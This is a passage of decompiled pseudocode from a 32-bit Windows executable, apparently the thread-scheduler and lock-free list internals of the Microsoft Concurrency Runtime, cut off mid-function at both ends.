  (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(this + 424) + 4))(*(_DWORD *)(this + 424));
  return sub_4379F7();
}

//----- (00435669) --------------------------------------------------------
int __thiscall sub_435669(_DWORD *this)
{
  volatile __int32 *v2; // ebx
  unsigned int i; // eax
  unsigned int v4; // esi
  int result; // eax

  v2 = this + 81;
  sub_4304D3(this + 81);
  for ( i = sub_437F6B(this); ; i = sub_437F23(this, v4) )
  {
    v4 = i;
    result = sub_430514(v2);
    if ( !v4 )
      break;
    sub_4356AC(this, v4);
    sub_4304D3(v2);
  }
  return result;
}

//----- (004356AC) --------------------------------------------------------
int __thiscall sub_4356AC(int *this, unsigned int a2)
{
  _DWORD *v3; // ebx
  int v4; // eax
  unsigned int v5; // eax
  int v6; // eax
  int v7; // esi
  int result; // eax
  int v9; // ecx
  int v10; // [esp+Ch] [ebp-Ch] BYREF
  int *v11; // [esp+10h] [ebp-8h]
  _DWORD *v12; // [esp+14h] [ebp-4h]

  v10 = 0;
  v11 = &v10;
  v3 = this + 81;
  v12 = this + 81;
  sub_4304D3(this + 81);
  v4 = this[79];
  if ( v4 )
  {
    do
    {
      if ( a2 )
      {
        v5 = *(_DWORD *)(v4 + 8);
        if ( v5 < this[85] || v5 > a2 )
          break;
      }
      v6 = sub_4358E1(this + 79);
      v7 = v6 + 12;
      *(_DWORD *)(v6 + 12) = 0;
      *v11 = v6;
      v4 = this[79];
      v11 = (int *)v7;
    }
    while ( v4 );
    v3 = v12;
  }
  for ( result = sub_430514(v3); ; result = (*(int (__cdecl **)(_DWORD))v9)(*(_DWORD *)(v9 + 4)) )
  {
    v9 = v10;
    if ( !v10 )
      break;
    v10 = *(_DWORD *)(v10 + 12);
    if ( !v10 )
      v11 = &v10;
  }
  return result;
}

//----- (0043574C) --------------------------------------------------------
unsigned int __thiscall sub_43574C(_DWORD *this)
{
  int v2; // esi
  unsigned int v3; // edi
  int v4; // eax
  int v5; // ecx
  _DWORD *v6; // eax
  int v7; // eax
  unsigned int v8; // eax
  int v10; // [esp+Ch] [ebp-10h]
  int v11; // [esp+10h] [ebp-Ch]
  int v12; // [esp+14h] [ebp-8h]
  char v13; // [esp+1Bh] [ebp-1h]

  v13 = 0;
  v2 = 0;
  v3 = 0;
  v11 = 0;
  if ( (int)this[11] > 0 )
  {
    while ( 1 )
    {
      v4 = *(_DWORD *)(this[8] + 4 * v2);
      v10 = v4;
      if ( v4 )
      {
        v5 = 0;
        v12 = 0;
        if ( *(int *)(v4 + 120) > 0 )
          break;
      }
LABEL_15:
      v11 = ++v2;
      if ( v2 >= this[11] )
        return v3;
    }
    v6 = (_DWORD *)(v4 + 56);
    while ( 1 )
    {
      v7 = sub_434DA3(v6, v5);
      if ( v7 )
      {
        v8 = *(_DWORD *)(v7 + 192);
        if ( v8 < this[85] )
          v8 = -1;
        if ( !v13 )
        {
          v13 = 1;
LABEL_12:
          v3 = v8;
          goto LABEL_13;
        }
        if ( v3 > v8 )
          goto LABEL_12;
      }
LABEL_13:
      v6 = (_DWORD *)(v10 + 56);
      v5 = v12 + 1;
      v12 = v5;
      if ( v5 >= *(_DWORD *)(v10 + 120) )
      {
        v2 = v11;
        goto LABEL_15;
      }
    }
  }
  return v3;
}

//----- (004357D5) --------------------------------------------------------
int __thiscall sub_4357D5(int this, int a2)
{
  void *v3; // edx
  int result; // eax
  unsigned int v5; // edi
  unsigned int v6; // edx

  v3 = *(void **)this;
  if ( *(_DWORD *)this != *(_DWORD *)a2 )
  {
    result = sub_43708A((void **)this, *(void **)a2);
    v3 = *(void **)this;
  }
  v5 = 0;
  v6 = ((unsigned int)v3 + 31) >> 5;
  if ( v6 )
  {
    do
    {
      result = *(_DWORD *)(*(_DWORD *)(a2 + 4) + 4 * v5);
      *(_DWORD *)(*(_DWORD *)(this + 4) + 4 * v5++) = result;
    }
    while ( v5 < v6 );
  }
  return result;
}

//----- (00435813) --------------------------------------------------------
_DWORD *sub_435813()
{
  volatile signed __int32 *v0; // ebx
  _DWORD *v1; // edi

  v0 = (volatile signed __int32 *)sub_435F0F();
  v1 = sub_435371(v0, 0);
  (*(void (__thiscall **)(volatile signed __int32 *))(*v0 + 20))(v0);
  return v1;
}

//----- (0043583F) --------------------------------------------------------
int *__thiscall sub_43583F(int this, _DWORD *a2)
{
  return sub_436A00(this, a2);
}

//----- (00435848) --------------------------------------------------------
int *__thiscall sub_435848(void *this)
{
  int v2[4]; // [esp+0h] [ebp-10h] BYREF

  memset(v2, 0, sizeof(v2));
  return sub_436A00((int)this, v2);
}

//----- (00435867) --------------------------------------------------------
HANDLE *__cdecl sub_435867(int *a1)
{
  HANDLE *v1; // eax

  sub_43A524(a1);
  sub_435551();
  v1 = sub_44126E((const void **)a1);
  if ( v1 )
    return v1 + 2;
  else
    return 0;
}

//----- (0043588D) --------------------------------------------------------
int __thiscall sub_43588D(int this)
{
  int result; // eax

  result = _InterlockedDecrement((volatile signed __int32 *)(this + 392));
  if ( !result )
    return sub_435A00((_DWORD **)this);
  return result;
}

//----- (004358A6) --------------------------------------------------------
signed __int32 __thiscall sub_4358A6(int this)
{
  signed __int32 result; // eax

  result = _InterlockedIncrement((volatile signed __int32 *)(this + 484));
  if ( result == 1 )
    return SetEvent(*(HANDLE *)(this + 472));
  return result;
}

//----- (004358C4) --------------------------------------------------------
int __thiscall sub_4358C4(int *this)
{
  int v2; // edx
  int v4; // ecx

  v2 = *this;
  if ( !*this )
    return 0;
  v4 = *(_DWORD *)(v2 + 232);
  *this = v4;
  if ( !v4 )
    this[1] = (int)this;
  return v2;
}

//----- (004358E1) --------------------------------------------------------
int __thiscall sub_4358E1(int *this)
{
  int v2; // edx
  int v4; // ecx

  v2 = *this;
  if ( !*this )
    return 0;
  v4 = *(_DWORD *)(v2 + 12);
  *this = v4;
  if ( !v4 )
    this[1] = (int)this;
  return v2;
}

//----- (004358FB) --------------------------------------------------------
int __thiscall sub_4358FB(int *this)
{
  _DWORD *v2; // esi
  int v3; // edi

  v2 = this + 2;
  sub_4304D3(this + 2);
  v3 = sub_4358C4(this);
  sub_430514(v2);
  return v3;
}

//----- (0043592F) --------------------------------------------------------
int __thiscall sub_43592F(HANDLE *this)
{
  UnregisterWaitEx(this[119], (HANDLE)0xFFFFFFFF);
  if ( sub_43268A() < 3 )
    sub_42FDE8(0, this[120], (HANDLE)0xFFFFFFFF);
  else
    sub_430244((int)this[120]);
  CloseHandle(this[118]);
  return sub_43588D((int)this);
}
// 43268A: using guessed type int sub_43268A(void);

//----- (0043597A) --------------------------------------------------------
int __thiscall sub_43597A(volatile signed __int32 *this, struct _SINGLE_LIST_ENTRY *a2, char a3)
{
  struct _SINGLE_LIST_ENTRY *v3; // esi
  int result; // eax

  v3 = 0;
  if ( a3 )
    v3 = (struct _SINGLE_LIST_ENTRY *)sub_438CB3(a2);
  sub_43721F((int)this, a2);
  result = sub_437261(this);
  if ( v3 )
  {
    if ( !LOBYTE(v3[19].Next) )
      return sub_43EBB9(v3 - 1);
  }
  return result;
}

//----- (004359BC) --------------------------------------------------------
LPVOID sub_4359BC()
{
  return sub_430184(dword_4927F0);
}

//----- (004359C9) --------------------------------------------------------
int sub_4359C9()
{
  _DWORD *v0; // eax

  v0 = sub_430184(dword_4927F0);
  if ( v0 )
    return sub_41DA3D(v0);
  else
    return 0;
}

//----- (004359E3) --------------------------------------------------------
int __thiscall sub_4359E3(_DWORD *this)
{
  unsigned int v1; // edx
  unsigned int i; // esi
  int result; // eax

  v1 = (unsigned int)(*this + 31) >> 5;
  for ( i = 0; i < v1; ++i )
  {
    result = this[1];
    *(_DWORD *)(result + 4 * i) = -1;
  }
  return result;
}

//----- (00435A00) --------------------------------------------------------
int __thiscall sub_435A00(_DWORD **this)
{
  _DWORD **v1; // ebx
  _DWORD *v2; // edi
  _DWORD *v3; // esi
  PSLIST_ENTRY v4; // eax
  int i; // edx
  int v6; // esi
  PSLIST_ENTRY v7; // eax
  int v8; // ebx
  int v9; // edi
  HANDLE *v10; // esi

  v1 = this;
  (*(void (__thiscall **)(_DWORD *))(*this[107] + 4))(this[107]);
  CloseHandle(v1[95]);
  v2 = (_DWORD *)_InterlockedExchange((volatile __int32 *)v1 + 45, 0);
  if ( v2 )
  {
    do
    {
      v3 = (_DWORD *)*v2;
      sub_4345C0(v2[1]);
      sub_42CF7C(v2);
      v2 = v3;
    }
    while ( v3 );
  }
  v4 = InterlockedFlushSList((PSLIST_HEADER)v1 + 62);
  for ( i = v4 != 0 ? (unsigned int)&v4[-1] : 0; i; i = v6 != 0 ? v6 - 4 : 0 )
  {
    v6 = *(_DWORD *)(i + 4);
    sub_43459D(i);
  }
  v7 = InterlockedFlushSList((PSLIST_HEADER)v1 + 63);
  if ( (v7 != 0 ? (unsigned int)&v7[-3] : 0) != 0 )
  {
    v8 = v7 != 0 ? (unsigned int)&v7[-3] : 0;
    do
    {
      v9 = *(_DWORD *)(v8 + 12) != 0 ? *(_DWORD *)(v8 + 12) - 12 : 0;
      (**(void (__thiscall ***)(int, int))v8)(v8, 1);
      v8 = v9;
    }
    while ( v9 );
    v1 = this;
  }
  sub_437E96(2, 4u, (int)v1[93]);
  while ( v1[46] )
  {
    v10 = (HANDLE *)sub_437612((int)(v1 + 46));
    SetEvent(v10[2]);
    CloseHandle(v10[2]);
    sub_42CF7C(v10);
  }
  return ((int (__thiscall *)(_DWORD **, int))**v1)(v1, 1);
}

//----- (00435B2A) --------------------------------------------------------
_DWORD *__thiscall sub_435B2A(unsigned int *this, _DWORD *a2, _DWORD *a3)
{
  int v4; // eax
  _DWORD *result; // eax

  v4 = sub_4364AB((int)a2, *this);
  result = sub_436C0C(this, a2, v4);
  if ( !result )
    return 0;
  if ( a3 )
    *a3 = result[2];
  return result;
}

//----- (00435B60) --------------------------------------------------------
int __thiscall sub_435B60(void *this)
{
  int v2; // edi
  void **v3; // eax
  void **v4; // esi

  v2 = 0;
  v3 = (void **)sub_430184(dword_4927F0);
  v4 = v3;
  if ( v3 && v3[7] == this && !*((_BYTE *)v3 + 76) )
  {
    UserMathErrorFunction();
    v2 = *((_DWORD *)v4[39] + 20);
    UserMathErrorFunction();
  }
  return v2;
}

//----- (00435BA1) --------------------------------------------------------
int __thiscall sub_435BA1(unsigned int *this, _DWORD *a2)
{
  int v3; // esi
  int v5; // [esp+8h] [ebp-8h] BYREF
  int v6; // [esp+Ch] [ebp-4h] BYREF

  v3 = 0;
  if ( (*a2 & 0xFFFFFFF) == 2 )
    return *(_DWORD *)(this[8] + 4 * a2[2]);
  if ( (*a2 & 0xFFFFFFF) == 3 )
  {
    v6 = a2[2];
    if ( sub_435B2A(this + 87, &v6, &v5) )
      return *(_DWORD *)(this[8] + 4 * v5);
  }
  return v3;
}

//----- (00435BFA) --------------------------------------------------------
int __stdcall sub_435BFA(int a1, int a2, _DWORD *a3, _DWORD *a4)
{
  int result; // eax

  for ( result = 0; a1 < a2 && !result; result = sub_434DA3(a4, a1++) )
    ;
  *a3 = a1 - 1;
  return result;
}

//----- (00435C25) --------------------------------------------------------
int __thiscall sub_435C25(_DWORD *this, int a2, int a3, _DWORD *a4)
{
  int result; // eax

  for ( result = 0; a2 < a3 && !result; result = sub_434DA3(this + 14, a2++) )
    ;
  *a4 = a2 - 1;
  return result;
}

//----- (00435C54) --------------------------------------------------------
char __thiscall sub_435C54(unsigned int *this, __int32 *a2, int a3, int a4, int a5, int a6, int a7)
{
  char v7; // bl
  _DWORD *v9; // esi
  int v10; // esi
  int v11; // eax
  unsigned int v12; // eax
  _DWORD *v13; // esi
  int v14; // esi
  _DWORD *v15; // ecx
  int v17; // [esp-14h] [ebp-2Ch] BYREF
  int v18; // [esp-10h] [ebp-28h]
  int v19; // [esp-Ch] [ebp-24h]
  int v20; // [esp-8h] [ebp-20h]
  int v21; // [esp-4h] [ebp-1Ch]
  int v22; // [esp+10h] [ebp-8h]
  int i; // [esp+14h] [ebp-4h]

  v7 = 1;
  if ( (a3 & 0xFFFFFFF) == 1 )
  {
    v10 = 0;
    v11 = this[7] + 16 * a5;
    v22 = v11;
    for ( i = 0; v10 < (int)this[11]; i = v10 )
    {
      if ( ((1 << (v10 & 0x1F)) & *(_DWORD *)(*(_DWORD *)(v11 + 4) + 4 * ((unsigned int)v10 >> 5))) != 0 )
      {
        v12 = this[8];
        v21 = a7;
        v13 = *(_DWORD **)(v12 + 4 * v10);
        sub_4380FD(&v17, &a3);
        if ( sub_43DAC8(v13, a2, v17, v18, v19, v20, v21) )
          return v7;
        v10 = i;
      }
      v11 = v22;
      ++v10;
    }
  }
  else if ( (a3 & 0xFFFFFFFu) - 2 <= 1 )
  {
    v9 = (_DWORD *)sub_435BA1(this, &a3);
    if ( v9 )
    {
      v21 = a7;
      sub_4380FD(&v17, &a3);
      if ( sub_43DAC8(v9, a2, v17, v18, v19, v20, v21) )
        return v7;
    }
  }
  v14 = 0;
  if ( (int)this[11] <= 0 )
    return 0;
  while ( 1 )
  {
    v15 = *(_DWORD **)(this[8] + 4 * v14);
    if ( v15 )
    {
      if ( (int)v15[7] > 0 && sub_43DAC8(v15, a2, 0, 0, 0, 0, a7) )
        break;
    }
    if ( ++v14 >= (int)this[11] )
      return 0;
  }
  return v7;
}

//----- (00435D5C) --------------------------------------------------------
char __thiscall sub_435D5C(_DWORD *this)
{
  _DWORD *v1; // ecx
  char v2; // dl

  v1 = (_DWORD *)this[45];
  v2 = 0;
  while ( v1 )
  {
    if ( !*(_BYTE *)(v1[1] + 236) && *(_DWORD *)(v1[1] + 44) )
      return 1;
    v1 = (_DWORD *)*v1;
  }
  return v2;
}

//----- (00435D86) --------------------------------------------------------
char __thiscall sub_435D86(_DWORD *this)
{
  int v2; // ecx
  char v3; // bl
  int *v4; // esi
  int v5; // edi
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  int v8; // edi
  _DWORD *v9; // eax
  _DWORD *v11; // [esp+4h] [ebp-Ch]
  void *v12; // [esp+8h] [ebp-8h]
  void *v13; // [esp+8h] [ebp-8h]
  int v14; // [esp+Ch] [ebp-4h]

  v2 = 0;
  v3 = 0;
  v11 = this;
  v14 = 0;
  if ( (int)this[11] <= 0 )
    return v3;
  while ( 1 )
  {
    v4 = *(int **)(this[9] + 4 * v2);
    if ( v4 )
      break;
LABEL_19:
    this = v11;
    v14 = ++v2;
    if ( v2 >= v11[11] )
      return v3;
  }
  v5 = 0;
  if ( v4[20] <= 0 )
  {
LABEL_10:
    if ( v3 )
      return v3;
    v8 = 0;
    if ( v4[40] > 0 )
    {
      while ( 1 )
      {
        v9 = (_DWORD *)sub_434DA3(v4 + 24, v8);
        v13 = v9;
        if ( v9 )
        {
          if ( sub_440297(v9) || sub_44029F(v13) )
            break;
        }
        if ( ++v8 >= v4[40] )
          goto LABEL_18;
      }
      v3 = 1;
LABEL_18:
      v2 = v14;
    }
    goto LABEL_19;
  }
  v6 = v4 + 4;
  while ( 1 )
  {
    v7 = (_DWORD *)sub_434DA3(v6, v5);
    v12 = v7;
    if ( v7 )
    {
      if ( sub_440297(v7) || sub_44029F(v12) )
        return 1;
    }
    ++v5;
    v6 = v4 + 4;
    if ( v5 >= v4[20] )
    {
      v2 = v14;
      goto LABEL_10;
    }
  }
}

//----- (00435E50) --------------------------------------------------------
int __thiscall sub_435E50(_DWORD *this)
{
  return *(_DWORD *)(sub_4361F0(this) + 8);
}

//----- (00435E59) --------------------------------------------------------
_DWORD *__thiscall sub_435E59(unsigned int *this, _DWORD *a2, _DWORD *a3)
{
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  unsigned int v10; // [esp+10h] [ebp-18h] BYREF
  int v11[5]; // [esp+14h] [ebp-14h] BYREF

  v4 = sub_43268F();
  sub_4347C5(a2, v4);
  v11[4] = 0;
  v11[1] = 1;
  v5 = *a3 & 0xFFFFFFF;
  if ( !v5 )
  {
    sub_4359E3(a2);
    return a2;
  }
  v6 = v5 - 1;
  if ( !v6 )
  {
    v8 = 16 * a3[2] + 8 + this[7];
    goto LABEL_8;
  }
  v7 = v6 - 1;
  if ( !v7 )
  {
    v8 = *(_DWORD *)(this[8] + 4 * a3[2]) + 8;
LABEL_8:
    sub_4357D5((int)a2, v8);
    return a2;
  }
  if ( v7 == 1 )
  {
    v11[0] = a3[2];
    sub_435B2A(this + 90, v11, &v10);
    *(_DWORD *)(a2[1] + 4 * (v10 >> 5)) |= 1 << (v10 & 0x1F);
  }
  return a2;
}

//----- (00435F0F) --------------------------------------------------------
int sub_435F0F()
{
  int result; // eax
  char v1; // [esp+0h] [ebp-24h]
  void *v2[3]; // [esp+14h] [ebp-10h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  sub_4304E3(&dword_492814);
  v3 = 0;
  if ( !dword_4927E8 || !sub_43783C((volatile signed __int32 *)dword_4927E8) )
  {
    sub_43A1ED(v2, 0, v1);
    LOBYTE(v3) = 1;
    if ( dword_4927EC )
      sub_43A28F(v2, (const void **)dword_4927EC);
    dword_4927E8 = (int)sub_435867((int *)v2);
    sub_4364DE((_DWORD *)dword_4927E8);
    (*(void (__thiscall **)(int))(*(_DWORD *)dword_4927E8 + 16))(dword_4927E8);
    sub_43A283(v2);
  }
  result = dword_4927E8;
  dword_492814 = 0;
  return result;
}
// 435F45: variable 'v1' is possibly undefined
// 4927E8: using guessed type int dword_4927E8;
// 4927EC: using guessed type int dword_4927EC;
// 492814: using guessed type int dword_492814;

//----- (00435FAC) --------------------------------------------------------
_DWORD *__thiscall sub_435FAC(union _SLIST_HEADER *this, char a2)
{
  PSLIST_ENTRY v3; // eax
  int v4; // esi
  _DWORD *v5; // eax

  v3 = InterlockedPopEntrySList(this + 62);
  v4 = v3 != 0 ? (unsigned int)&v3[-1] : 0;
  if ( v4 )
  {
    sub_440FBA(v4, a2);
  }
  else
  {
    v5 = operator new(0xB0u);
    if ( v5 )
      return sub_440D24(v5, (int)this, a2);
  }
  return (_DWORD *)v4;
}

//----- (0043600C) --------------------------------------------------------
int __thiscall sub_43600C(int this, char a2)
{
  char v3; // bl
  int result; // eax
  unsigned int v5; // esi
  PSLIST_ENTRY v6; // eax
  _DWORD *v7; // ebx

  v3 = a2;
  if ( a2 )
  {
    if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)this + 88))(this) )
    {
      result = sub_4362DB((union _SLIST_HEADER *)this);
      if ( result )
        return result;
    }
    v5 = sub_437D94((_DWORD *)this, 1);
    if ( v5 )
    {
      if ( (unsigned int)j____crtGetTickCount64() - *(_DWORD *)(this + 464) < v5 )
        return 0;
      v3 = 0;
    }
  }
  _InterlockedIncrement((volatile signed __int32 *)(this + 400));
  if ( !v3 )
    *(_QWORD *)(this + 464) = j____crtGetTickCount64();
  v6 = InterlockedPopEntrySList((PSLIST_HEADER)(this + 488));
  v7 = v6 != 0 ? (_DWORD *)&v6[-2] : 0;
  if ( !v7 )
  {
    v7 = (_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)this + 64))(this);
    sub_435148((volatile signed __int32 *)this, (int)v7);
    _InterlockedIncrement((volatile signed __int32 *)(this + 392));
  }
  sub_43EC56(v7);
  v7[39] = 0;
  (*(void (__thiscall **)(_DWORD, _DWORD *))(**(_DWORD **)(this + 428) + 8))(*(_DWORD *)(this + 428), v7);
  if ( v7 )
  {
    v7[4] = 0;
    v7[5] = 0;
  }
  return (int)v7;
}
// 43001E: using guessed type __int64 j____crtGetTickCount64(void);

//----- (0043612F) --------------------------------------------------------
signed __int32 __thiscall sub_43612F(volatile signed __int32 *this)
{
  return _InterlockedIncrement(this + 82);
}

//----- (0043613C) --------------------------------------------------------
signed __int32 __thiscall sub_43613C(volatile signed __int32 *this)
{
  return _InterlockedIncrement(this + 83);
}

//----- (00436156) --------------------------------------------------------
int __thiscall sub_436156(int this)
{
  volatile signed __int32 *v2; // edi
  int v3; // eax
  int v4; // esi

  v2 = (volatile signed __int32 *)(this + 308);
  sub_42E793((volatile signed __int32 *)(this + 308));
  v3 = sub_4375C6((int *)(this + 304));
  v4 = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 12) = 1;
  sub_42E8AD(v2);
  return v4;
}

//----- (0043618B) --------------------------------------------------------
int __stdcall sub_43618B(_DWORD *a1, int a2, _DWORD *a3)
{
  int v3; // edx
  int result; // eax

  v3 = *a1 + 1;
  if ( v3 <= a2 )
    return sub_435BFA(v3, a2, a1, a3);
  result = sub_435BFA(v3, a3[16], a1, a3);
  v3 = 0;
  if ( !result )
    return sub_435BFA(v3, a2, a1, a3);
  return result;
}

//----- (004361C7) --------------------------------------------------------
int __thiscall sub_4361C7(_DWORD *this, int a2, int a3)
{
  int v3; // esi
  int v4; // eax

  v3 = this[9];
  v4 = sub_436211(this, *(_DWORD *)(a3 + 184));
  return a2 != *(_DWORD *)(v3 + 4 * v4) ? *(_DWORD *)(v3 + 4 * v4) : 0;
}

//----- (004361F0) --------------------------------------------------------
int __thiscall sub_4361F0(_DWORD *this)
{
  int v1; // esi
  int v3; // [esp-4h] [ebp-Ch]

  v3 = this[94];
  v1 = *(_DWORD *)(this[9] + 4 * v3);
  this[94] = sub_436211(this, v3);
  return v1;
}

//----- (00436211) --------------------------------------------------------
int __thiscall sub_436211(_DWORD *this, int a2)
{
  do
    a2 = (a2 + 1) % this[11];
  while ( !*(_DWORD *)(*(_DWORD *)(this[9] + 4 * a2) + 188) );
  return a2;
}

//----- (00436233) --------------------------------------------------------
int __thiscall sub_436233(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // edx
  int result; // eax

  v4 = *a2 + 1;
  if ( v4 <= a3 )
    return sub_435C25(this, v4, a3, a2);
  result = sub_435C25(this, v4, this[30], a2);
  v4 = 0;
  if ( !result )
    return sub_435C25(this, v4, a3, a2);
  return result;
}

//----- (00436268) --------------------------------------------------------
_DWORD *__thiscall sub_436268(const void **this, _DWORD *a2)
{
  sub_43A20B(a2, this + 1);
  return a2;
}

//----- (0043627E) --------------------------------------------------------
int __thiscall sub_43627E(union _SLIST_HEADER *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3)
{
  PSLIST_ENTRY v3; // eax
  int v4; // edx
  _DWORD *v5; // eax

  v3 = InterlockedPopEntrySList(this + 63);
  v4 = v3 != 0 ? (unsigned int)&v3[-3] : 0;
  if ( v4 )
  {
    (v3 != 0 ? &v3[-2] : (struct _SINGLE_LIST_ENTRY *)4)->Next = a2;
    (v3 != 0 ? &v3[-1] : (struct _SINGLE_LIST_ENTRY *)8)->Next = a3;
    goto LABEL_6;
  }
  v5 = operator new(0x10u);
  v4 = (int)v5;
  if ( v5 )
  {
    v5[1] = a2;
    *v5 = &Concurrency::details::RealizedChore::`vftable';
    v5[2] = a3;
LABEL_6:
    *(_DWORD *)(v4 + 12) = 0;
    return v4;
  }
  return 0;
}
// 470FE4: using guessed type void *Concurrency::details::RealizedChore::`vftable';

//----- (004362DB) --------------------------------------------------------
int __thiscall sub_4362DB(union _SLIST_HEADER *this)
{
  PSLIST_ENTRY v1; // eax

  v1 = InterlockedPopEntrySList(this + 64);
  return v1 != 0 ? (unsigned int)&v1[-2] : 0;
}

//----- (004362F2) --------------------------------------------------------
int __thiscall sub_4362F2(int *this)
{
  int *v1; // ecx

  v1 = this + 74;
  if ( *v1 )
    return sub_4358FB(v1);
  else
    return 0;
}

//----- (00436305) --------------------------------------------------------
PSLIST_ENTRY __cdecl sub_436305(char a1)
{
  PSLIST_ENTRY v2; // esi

  if ( a1 )
  {
    if ( dword_4927FC[0] >= 32 )
      return 0;
    _InterlockedIncrement(dword_4927FC);
  }
  v2 = InterlockedPopEntrySList(&ListHead);
  if ( !v2 )
  {
    v2 = (PSLIST_ENTRY)operator new(0x308u);
    if ( v2 )
    {
      `eh vector constructor iterator'(
        &v2[1],
        8u,
        0x60u,
        (void (__thiscall *)(void *))sub_43DC2D,
        (void (__thiscall *)(void *))sub_43DC42);
      LOBYTE(v2[193].Next) = 0;
    }
    else
    {
      v2 = 0;
    }
  }
  LOBYTE(v2[193].Next) = a1;
  return v2;
}
// 4927FC: using guessed type signed __int32 dword_4927FC[3];

//----- (00436385) --------------------------------------------------------
int __thiscall sub_436385(_DWORD *this, int a2)
{
  if ( *(_DWORD *)(*(_DWORD *)(this[9] + 4 * a2) + 188) )
    return a2;
  else
    return sub_436211(this, a2);
}

//----- (004363A8) --------------------------------------------------------
void __thiscall sub_4363A8(void *this, int a2)
{
  int v2; // ebx
  int v4; // eax
  unsigned int v5; // edx
  unsigned int v6; // ecx
  int v7; // [esp+8h] [ebp-4h]

  v2 = a2;
  if ( a2 != *(_DWORD *)this )
  {
    v4 = unknown_libname_45((unsigned __int64)((unsigned int)(a2 + 31) >> 5) >> 30 != 0 ? -1 : 4
                                                                                             * ((unsigned int)(a2 + 31) >> 5));
    v5 = 0;
    v7 = v4;
    v6 = (unsigned int)(*(_DWORD *)this + 31) >> 5;
    if ( v6 )
    {
      do
      {
        *(_DWORD *)(v4 + 4 * v5) = *(_DWORD *)(*((_DWORD *)this + 1) + 4 * v5);
        ++v5;
      }
      while ( v5 < v6 );
      v2 = a2;
    }
    memset((void *)(v4 + 4 * v6), 0, 4 * (((unsigned int)(a2 + 31) >> 5) - v6));
    j_j_j___free_base(*((void **)this + 1));
    *((_DWORD *)this + 1) = v7;
    *(_DWORD *)this = v2;
  }
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);

//----- (00436427) --------------------------------------------------------
void __thiscall sub_436427(void **this, int a2)
{
  unsigned int v3; // ebx
  int v4; // edx
  unsigned int v5; // ecx
  void *i; // [esp+Ch] [ebp-4h]

  v3 = (unsigned int)*this;
  if ( (void *)a2 != *this )
  {
    sub_4363A8(this, a2);
    v4 = unknown_libname_45((unsigned __int64)(unsigned int)a2 >> 30 != 0 ? -1 : 4 * a2);
    v5 = 0;
    for ( i = (void *)v4; v5 < v3; ++v5 )
      *(_DWORD *)(v4 + 4 * v5) = *((_DWORD *)this[2] + v5);
    memset((void *)(v4 + 4 * v3), 0, 4 * (a2 - v3));
    j_j_j___free_base(this[2]);
    this[2] = i;
  }
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);

//----- (00436498) --------------------------------------------------------
bool __thiscall sub_436498(_DWORD *this)
{
  return (this[101] & 0xA0000000) == -1610612736;
}

//----- (004364AB) --------------------------------------------------------
int __cdecl sub_4364AB(int a1, unsigned int a2)
{
  unsigned int v2; // edx
  unsigned int i; // ecx

  v2 = -2128831035;
  for ( i = 0; i < 4; ++i )
    v2 = 16777619 * (v2 ^ *(unsigned __int8 *)(i + a1));
  return v2 % a2;
}

//----- (004364D7) --------------------------------------------------------
int __thiscall sub_4364D7(_DWORD *this)
{
  return this[93];
}

//----- (004364DE) --------------------------------------------------------
int __thiscall sub_4364DE(_DWORD *this)
{
  int v1; // ebx
  _DWORD *v2; // edi
  unsigned int v3; // esi
  int v4; // ecx
  unsigned int *v5; // eax
  unsigned int v6; // eax
  int v7; // eax
  int v8; // esi
  int v9; // edi
  _DWORD *v10; // esi
  unsigned int v11; // edi
  int v12; // eax
  int v13; // eax
  int v14; // ecx
  int v15; // ecx
  unsigned int v16; // edi
  char v17; // si
  int v18; // edx
  int (__thiscall **v19)(int *); // eax
  union _SLIST_HEADER *v20; // eax
  int *v21; // esi
  void *v22; // eax
  char *v23; // eax
  bool v24; // zf
  int v25; // edi
  unsigned int *v26; // ebx
  unsigned int v27; // edx
  void *v28; // ecx
  int v29; // eax
  int v30; // esi
  unsigned int v31; // esi
  int v32; // eax
  unsigned int v33; // ecx
  int v34; // ebx
  int (__thiscall *v35)(int, int, int); // edi
  int v36; // eax
  void (__thiscall ***v37)(_DWORD, _DWORD); // eax
  _DWORD *v38; // ebx
  int Semaphore; // eax
  int LastError; // eax
  Concurrency::details::platform *v42; // [esp+0h] [ebp-74h]
  _DWORD pExceptionObject[4]; // [esp+10h] [ebp-64h] BYREF
  int v44; // [esp+20h] [ebp-54h] BYREF
  void *Block; // [esp+24h] [ebp-50h]
  void *v46; // [esp+28h] [ebp-4Ch]
  void *v47; // [esp+2Ch] [ebp-48h]
  int v48; // [esp+30h] [ebp-44h] BYREF
  unsigned int v49; // [esp+34h] [ebp-40h] BYREF
  char *v50; // [esp+38h] [ebp-3Ch]
  void *v51; // [esp+3Ch] [ebp-38h]
  unsigned int v52; // [esp+40h] [ebp-34h]
  int *v53; // [esp+44h] [ebp-30h]
  unsigned int v54; // [esp+48h] [ebp-2Ch] BYREF
  int v55; // [esp+4Ch] [ebp-28h] BYREF
  int i; // [esp+50h] [ebp-24h]
  _DWORD *v57; // [esp+54h] [ebp-20h]
  unsigned int v58; // [esp+58h] [ebp-1Ch] BYREF
  int *v59; // [esp+5Ch] [ebp-18h]
  unsigned int v60; // [esp+60h] [ebp-14h]
  _DWORD *v61; // [esp+64h] [ebp-10h]
  int v62; // [esp+70h] [ebp-4h]

  v1 = (int)this;
  v57 = this;
  v2 = 0;
  this[109] = 0;
  this[5] = 0;
  this[11] = 0;
  this[106] = sub_430FB9();
  *(_DWORD *)(v1 + 372) = Concurrency::details::platform::GetNextAsyncId(v42);
  *(_DWORD *)(v1 + 44) = sub_432694();
  v3 = sub_42FF74() + 1;
  *(_DWORD *)(v1 + 40) = v3;
  v50 = (char *)v3;
  v4 = (unsigned __int64)v3 >> 28 != 0 ? -1 : 16 * v3;
  v5 = (unsigned int *)unknown_libname_45(__CFADD__(v4, 4) ? -1 : v4 + 4);
  v51 = v5;
  v62 = 0;
  if ( v5 )
  {
    v2 = v5 + 1;
    *v5 = v3;
    `eh vector constructor iterator'(
      v5 + 1,
      0x10u,
      v3,
      (void (__thiscall *)(void *))sub_4347AD,
      (void (__thiscall *)(void *))sub_434C6E);
